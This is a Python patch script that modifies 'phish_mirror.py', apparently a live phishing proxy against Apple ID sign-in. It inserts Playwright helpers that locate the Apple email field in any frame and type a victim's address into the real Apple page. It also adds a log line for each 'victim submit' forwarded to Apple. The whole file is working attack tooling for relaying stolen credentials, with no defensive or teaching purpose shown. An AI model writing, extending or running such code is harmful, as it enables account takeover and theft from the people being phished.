"""Minimal Apple email locator + trace log patch for phish_mirror.py."""
from pathlib import Path

MIRROR = Path(__file__).with_name("phish_mirror.py")
text = MIRROR.read_text(encoding="utf-8")

BLOCK = '''
def _mirror_trace(msg: str) -> None:
    try:
        with (ROOT / "mirror_events.log").open("a", encoding="utf-8") as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} {msg}\\n")
    except OSError:
        pass


def _apple_email_field_locator(frame):
    if not frame:
        return None
    for sel in (
        "#account_name_text_field",
        'input[name="accountName"]',
        'input[type="email"]',
        'input[autocomplete="username"]',
    ):
        try:
            loc = frame.locator(sel).first
            if loc.count() > 0 and loc.is_visible(timeout=600):
                return loc
        except PlaywrightError:
            continue
    return None


def _apple_type_email_any_frame(apple: Page, email: str):
    target = (email or "").strip()
    if not target:
        return None, ""
    for frame in apple.frames:
        loc = _apple_email_field_locator(frame)
        if not loc:
            continue
        _set_apple_field_value(loc, target)
        try:
            written = (loc.input_value(timeout=1500) or "").strip()
        except PlaywrightError:
            written = ""
        if written:
            return frame, written
    return None, ""


'''

if "_mirror_trace(msg" not in text:
    text = text.replace(
        "def _apple_force_email_field(frame, email: str) -> str:",
        BLOCK.strip() + "\n\n\ndef _apple_force_email_field(frame, email: str) -> str:",
        1,
    )

old = "    field = frame.locator('#account_name_text_field')\n    if not target:"
new = "    loc = _apple_email_field_locator(frame)\n    field = loc if loc else frame.locator('#account_name_text_field')\n    if not target:"
if old in text and "loc = _apple_email_field_locator(frame)" not in text.split("_apple_force_email_field")[1][:600]:
    text = text.replace(old, new, 1)

old2 = "        field = frame.locator('#account_name_text_field')\n        field.wait_for(state='visible', timeout=8000)"
new2 = (
    "        loc = _apple_email_field_locator(frame)\n"
    "        if not loc:\n"
    "            nf, _w = _apple_type_email_any_frame(apple, target)\n"
    "            if nf:\n"
    "                frame = nf\n"
    "                loc = _apple_email_field_locator(frame)\n"
    "        field = loc if loc else frame.locator('#account_name_text_field')\n"
    "        field.wait_for(state='visible', timeout=8000)"
)
if old2 in text:
    text = text.replace(old2, new2, 1)

old3 = "                                print(f'  [fwd] victim submit -> forward_email ({account})', flush=True)\n                                frame = ensure_apple_signin_frame(apple, frame)"
new3 = "                                print(f'  [fwd] victim submit -> forward_email ({account})', flush=True)\n                                _mirror_trace('submit ' + account)\n                                frame = ensure_apple_signin_frame(apple, frame)"
if old3 in text and "_mirror_trace('submit '" not in text:
    text = text.replace(old3, new3, 1)

MIRROR.write_text(text, encoding="utf-8")
import py_compile

py_compile.compile(str(MIRROR), doraise=True)
print("OK", MIRROR.stat().st_size)
